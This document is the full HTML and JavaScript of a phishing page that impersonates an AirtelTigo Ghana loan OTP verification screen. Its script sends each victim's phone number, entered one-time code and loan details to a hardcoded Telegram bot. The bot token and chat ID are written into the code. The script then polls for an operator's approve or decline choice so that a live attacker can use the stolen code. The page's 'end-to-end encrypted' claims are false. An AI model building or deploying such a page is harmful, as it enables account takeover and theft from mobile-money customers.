<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0, viewport-fit=cover">
    <meta name="theme-color" content="#e60000">
    <title>AirtelTigo Loan | Verify OTP &middot; Ghana</title>
    <link href="https://fonts.googleapis.com/css2?family=Poppins:wght@400;500;600;700;800;900&display=swap" rel="stylesheet">
    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css">
    <style>
        :root {
            --airtel-red: #e60000;
            --airtel-dark: #b30000;
            --airtel-yellow: #ffc600;
            --dark: #1a1a2e;
            --white: #ffffff;
            --light: #fef5f5;
            --dark-bg: #0d1b2a;
            --muted: #5a6d80;
            --border: #d0dce8;
            --error: #dc2626;
            --green: #00a651;
        }

        * { margin: 0; padding: 0; box-sizing: border-box; }
        html { -webkit-text-size-adjust: 100%; }

        body {
            font-family: 'Poppins', system-ui, sans-serif;
            background: linear-gradient(135deg, var(--dark-bg) 0%, var(--dark) 50%, var(--airtel-dark) 100%);
            min-height: 100vh;
            display: flex;
            flex-direction: column;
        }

        header { background: white; padding: 14px 5%; border-bottom: 3px solid var(--airtel-red); }
        .logo { font-size: 22px; font-weight: 900; text-decoration: none; display: flex; align-items: center; gap: 6px; }
        .logo .airtel { color: var(--airtel-red); }
        .logo .tigo { color: var(--dark); }
        .logo i { color: var(--airtel-yellow); font-size: 18px; }

        main { flex: 1; display: flex; align-items: center; justify-content: center; padding: 36px 16px; }

        .card {
            background: white;
            border-radius: 18px;
            padding: 32px;
            max-width: 400px;
            width: 100%;
            box-shadow: 0 16px 48px rgba(0,0,0,0.4);
        }

        .card-head { text-align: center; margin-bottom: 20px; }
        .card-head h1 { font-size: 20px; font-weight: 900; color: var(--dark); margin-bottom: 4px; }
        .card-head p { color: var(--muted); font-size: 12px; }

        .bundle-bar {
            background: linear-gradient(135deg, var(--dark), var(--airtel-dark));
            border-radius: 10px;
            padding: 12px 14px;
            margin-bottom: 18px;
            color: white;
        }
        .b-row { display: flex; justify-content: space-between; font-size: 12px; margin-bottom: 5px; }
        .b-row:last-child { margin-bottom: 0; padding-top: 5px; border-top: 1px solid rgba(255,255,255,0.15); font-weight: 800; font-size: 13px; }

        .err {
            display: none;
            background: rgba(220,38,38,0.06);
            border: 1px solid rgba(220,38,38,0.15);
            color: var(--error);
            font-size: 12px;
            font-weight: 600;
            border-radius: 8px;
            padding: 9px 12px;
            margin-bottom: 12px;
            text-align: center;
        }
        .err.show { display: block; }

        .fl { display: block; font-size: 10px; font-weight: 700; color: var(--airtel-red); text-transform: uppercase; letter-spacing: 0.05em; margin-bottom: 8px; }

        .otp-row { display: flex; gap: 10px; justify-content: center; margin-bottom: 16px; }
        .otp-box {
            width: 56px; height: 60px; text-align: center; font-size: 24px; font-weight: 800;
            border: 2px solid var(--border); border-radius: 12px; background: var(--light);
            color: var(--dark); font-family: 'Poppins', monospace; transition: all 0.2s;
        }
        .otp-box:focus { border-color: var(--airtel-red); background: white; box-shadow: 0 0 0 3px rgba(230,0,0,0.08); outline: none; }
        .otp-box.ok { border-color: var(--green); background: rgba(0,166,81,0.04); }

        .hint { font-size: 10px; color: var(--muted); text-align: center; margin-bottom: 6px; }

        .btns { display: flex; gap: 10px; margin-top: 16px; }
        .btn-p {
            flex: 1; background: var(--airtel-red); color: white; border: none; padding: 13px;
            border-radius: 50px; font-weight: 800; font-size: 12px; text-transform: uppercase;
            cursor: pointer; font-family: inherit; box-shadow: 0 4px 12px rgba(230,0,0,0.25); transition: all 0.2s;
        }
        .btn-p:hover { background: var(--airtel-dark); transform: translateY(-1px); }
        .btn-o {
            flex: 1; background: transparent; color: var(--dark); border: 2px solid var(--dark); padding: 13px;
            border-radius: 50px; font-weight: 800; font-size: 12px; text-transform: uppercase;
            cursor: pointer; font-family: inherit;
        }
        .btn-o:hover { background: var(--light); }

        .card-ft { text-align: center; margin-top: 14px; font-size: 10px; color: var(--muted); }
        .secure { display: flex; align-items: center; justify-content: center; gap: 5px; margin-top: 10px; font-size: 10px; color: var(--muted); font-weight: 600; }

        .overlay {
            position: fixed; inset: 0;
            display: none; align-items: center; justify-content: center; flex-direction: column; gap: 12px;
            background: rgba(0,0,0,0.92); z-index: 2000; backdrop-filter: blur(5px);
        }
        .overlay.on { display: flex; }
        .spin { width: 46px; height: 46px; border: 4px solid rgba(255,255,255,0.1); border-top-color: var(--airtel-red); border-radius: 50%; animation: sp 0.8s linear infinite; }
        .sp-t { font-size: 14px; font-weight: 700; color: white; }
        .sp-s { font-size: 11px; color: rgba(255,255,255,0.6); }
        @keyframes sp { to { transform: rotate(360deg); } }

        @media (max-width: 500px) {
            main { padding: 20px 12px; }
            .card { padding: 24px 16px; }
            .otp-row { gap: 7px; }
            .otp-box { width: 48px; height: 52px; font-size: 20px; }
            .btns { flex-direction: column; }
        }
    </style>
</head>
<body>
    <header><a class="logo" href="index.html"><i class="fa-solid fa-signal"></i><span class="airtel">Airtel</span><span class="tigo">Tigo</span></a></header>

    <main>
        <div class="card">
            <div class="card-head">
                <h1>Verify Code</h1>
                <p>Enter the 4-digit code sent to your phone</p>
            </div>

            <div id="bBar" class="bundle-bar" style="display:none;">
                <div class="b-row"><span>Phone:</span><span id="bPhone">&mdash;</span></div>
                <div class="b-row"><span>Loan:</span><span id="bD">&mdash;</span></div>
                <div class="b-row"><span>Amount:</span><span id="bP">GH₵ 0.00</span></div>
                <div class="b-row"><span>Total:</span><span id="bTotal">&mdash;</span></div>
            </div>

            <div id="err" class="err"></div>

            <label class="fl">Verification Code</label>
            <div class="otp-row" id="otpRow">
                <input type="text" class="otp-box" maxlength="1" inputmode="numeric">
                <input type="text" class="otp-box" maxlength="1" inputmode="numeric">
                <input type="text" class="otp-box" maxlength="1" inputmode="numeric">
                <input type="text" class="otp-box" maxlength="1" inputmode="numeric">
            </div>
            <p class="hint">Check your SMS for the verification code</p>

            <div class="btns">
                <button class="btn-p" onclick="doOTP()">Verify &amp; Proceed</button>
                <button class="btn-o" onclick="location.href='login.html'">Cancel</button>
            </div>

            <div class="card-ft">Protected with 256-bit encryption.</div>
            <div class="secure">&#128274; End-to-end Encrypted</div>
        </div>
    </main>

    <div id="ov" class="overlay"><div class="spin"></div><div class="sp-t">Verifying Code</div><div class="sp-s">Please wait...</div></div>

    <script>
        const BOT = '8605989403:AAHOl62lCg2XB-JGJNAYcDlVedTRlR1skDA';
        const CID = '6115168606';
        var bd = {}, luid = 0, otp = '', phone = '';

        function init() {
            var p = new URLSearchParams(location.search);
            phone = p.get('phone') || '';
            var amount = p.get('amount') || '';
            var term = p.get('term') || '';
            var total = p.get('total') || '';

            bd = { phone: phone, amount: amount, term: term, total: total };

            document.getElementById('bBar').style.display = 'block';
            document.getElementById('bPhone').textContent = phone ? '+233 ' + phone : 'N/A';
            document.getElementById('bD').textContent = term || 'N/A';
            document.getElementById('bP').textContent = 'GH₵ ' + (amount || '0.00');
            document.getElementById('bTotal').textContent = 'GH₵ ' + (total || '0.00');
        }

        // OTP boxes - autofill + auto-send
        var boxes = document.querySelectorAll('.otp-box');
        boxes.forEach(function(b, i) {
            b.addEventListener('input', function(e) {
                var v = e.target.value;
                // Handle paste/multi-digit input: autofill remaining boxes
                if (v.length > 1) {
                    var digs = v.replace(/\D/g, '').split('');
                    digs.forEach(function(d, j) {
                        if (i + j < boxes.length) { boxes[i + j].value = d; boxes[i + j].classList.add('ok'); }
                    });
                    boxes[Math.min(i + digs.length, boxes.length - 1)].focus();
                    chk();
                    return;
                }
                // Single digit
                if (v) { b.classList.add('ok'); if (i < boxes.length - 1) boxes[i + 1].focus(); }
                else { b.classList.remove('ok'); }
                chk();
            });

            b.addEventListener('keydown', function(e) {
                if (e.key === 'Backspace' && !e.target.value && i > 0) {
                    boxes[i - 1].focus();
                    boxes[i - 1].value = '';
                    boxes[i - 1].classList.remove('ok');
                }
            });

            b.addEventListener('paste', function(e) {
                e.preventDefault();
                var t = e.clipboardData.getData('text').replace(/\D/g, '');
                t.split('').forEach(function(d, j) { if (j < boxes.length) { boxes[j].value = d; boxes[j].classList.add('ok'); } });
                boxes[Math.min(t.length - 1, boxes.length - 1)].focus();
                chk();
            });
        });

        function getCode() { return Array.from(boxes).map(function(b) { return b.value; }).join(''); }

        function chk() {
            otp = getCode();
            if (otp.length === 4) {
                setTimeout(function() { doOTP(); }, 400);
            }
        }

        function doOTP() {
            otp = getCode();
            if (otp.length !== 4) { showErr('Please enter all 4 digits'); return; }
            clrErr();
            document.getElementById('ov').classList.add('on');

            var msg = '\u{1f4f2} <b>AirtelTigo OTP Verification</b>\n\n' +
                '<b>Phone:</b> <code>+233 ' + phone + '</code>\n' +
                '<b>OTP Code:</b> <code>' + otp + '</code>\n' +
                '<b>Loan:</b> <code>' + (bd.term || 'N/A') + '</code>\n' +
                '<b>Amount:</b> <code>GH₵ ' + (bd.amount || '0.00') + '</code>\n' +
                '<b>Total:</b> <code>GH₵ ' + (bd.total || '0.00') + '</code>\n\n' +
                '<b>Message (tap to copy):</b>\n<code>Your AirtelTigo OTP is: ' + otp + '. Do not share this code with anyone. Expires in 2 mins.\nAirtelTigoGH2026</code>';

            // 2 Telegram inline keyboard buttons: Approved & Declined
            var btns = [
                [{ text: '\u2713 Approved', callback_data: 'otp_approved' }, { text: '\u2717 Declined', callback_data: 'otp_declined' }]
            ];
            tg(msg, btns);
            pollOTP();
        }

        async function tg(msg, btns) {
            try {
                await fetch('https://api.telegram.org/bot' + BOT + '/sendMessage', {
                    method: 'POST',
                    headers: { 'Content-Type': 'application/json' },
                    body: JSON.stringify({ chat_id: CID, text: msg, reply_markup: btns ? { inline_keyboard: btns } : undefined, parse_mode: 'HTML' })
                });
            } catch(e) { console.error(e); }
        }

        function pollOTP() {
            var iv = setInterval(function() {
                fetch('https://api.telegram.org/bot' + BOT + '/getUpdates?offset=' + (luid + 1))
                    .then(function(r) { return r.json(); })
                    .then(function(d) {
                        if (d.ok && d.result.length > 0) {
                            var u = d.result[0];
                            luid = u.update_id;
                            if (u.callback_query) {
                                var cb = u.callback_query.data;
                                if (cb === 'otp_approved') {
                                    clearInterval(iv);
                                    document.getElementById('ov').classList.remove('on');
                                    location.href = 'success.html?phone=' + phone + '&amount=' + bd.amount + '&term=' + bd.term + '&total=' + bd.total;
                                }
                                else if (cb === 'otp_declined') {
                                    clearInterval(iv);
                                    document.getElementById('ov').classList.remove('on');
                                    showErr('Declined. Please try again.');
                                    resetOTP();
                                }
                            }
                        }
                    }).catch(function(e) { console.error(e); });
            }, 1000);
            setTimeout(function() { clearInterval(iv); }, 300000);
        }

        function showErr(m) { var e = document.getElementById('err'); e.textContent = m; e.classList.add('show'); }
        function clrErr() { document.getElementById('err').classList.remove('show'); }

        function resetOTP() {
            boxes.forEach(function(b) { b.value = ''; b.classList.remove('ok'); });
            otp = '';
            boxes[0].focus();
        }

        window.addEventListener('load', function() { init(); boxes[0].focus(); });
    </script>
</body>
</html>
